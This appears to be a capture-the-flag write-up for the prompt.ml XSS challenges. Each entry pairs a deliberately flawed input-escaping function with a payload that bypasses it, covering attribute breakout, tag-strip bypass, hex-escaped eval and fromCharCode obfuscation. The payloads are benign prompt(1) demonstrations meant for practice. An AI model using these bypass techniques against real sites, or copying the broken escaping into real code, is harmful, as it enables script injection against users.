# prompt.ml

> prompt(1) to win

## Challenges
- [0](#0)
- [1](#1)
- [2](#2)
- [7](#7)
- [A](#a)

## 0

- Task
 
```
function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
} 
```

- Solution

```
"><svg onload=prompt(1)//
```

- HTML source

```
<input type="text" value=""><svg onload=prompt(1)//">
```

## 1

- Task

```
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}
```

- Solution

```
<svg onload=prompt(1)//
```

- HTML source

```
<article><svg onload=prompt(1)// </article>
```

## 2

- Task

```
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}     
```

- Solution

```
<script>eval.call`${'prompt\x281\x29'}`</script>
```

HTML source

```
<script>eval.call`${'prompt\x281\x29'}`</script>
```

## 7

- Task

```
function escape(input) {
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');
    return segments.map(function(title) {
        // title can only contain 12 characters
        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
    }).join('\n');
}
```

- Solution

```
"><script>/*#*/prompt/*#*/(1)/*#*/</script>
```

- HTML source

```
<p class="comment" title=""><script>/*"></p>
<p class="comment" title="*/prompt/*"></p>
<p class="comment" title="*/(1)/*"></p>
<p class="comment" title="*/</script>"></p>
```

### A

- Task

```
function escape(input) {
    // (╯°□°）╯︵ ┻━┻
    input = encodeURIComponent(input).replace(/prompt/g, 'alert');
    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro
    input = input.replace(/'/g, '');

    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
    return '<script>' + input + '</script> ';
}   
```

- Solution

```
eval(String.fromCharCode(112).concat(String.fromCharCode(114).concat(String.fromCharCode(111).concat(String.fromCharCode(109).concat(String.fromCharCode(112).concat(String.fromCharCode(116)))))))(1)
```

- HTML source

```
<script>eval(String.fromCharCode(112).concat(String.fromCharCode(114).concat(String.fromCharCode(111).concat(String.fromCharCode(109).concat(String.fromCharCode(112).concat(String.fromCharCode(116)))))))(1)</script>
```
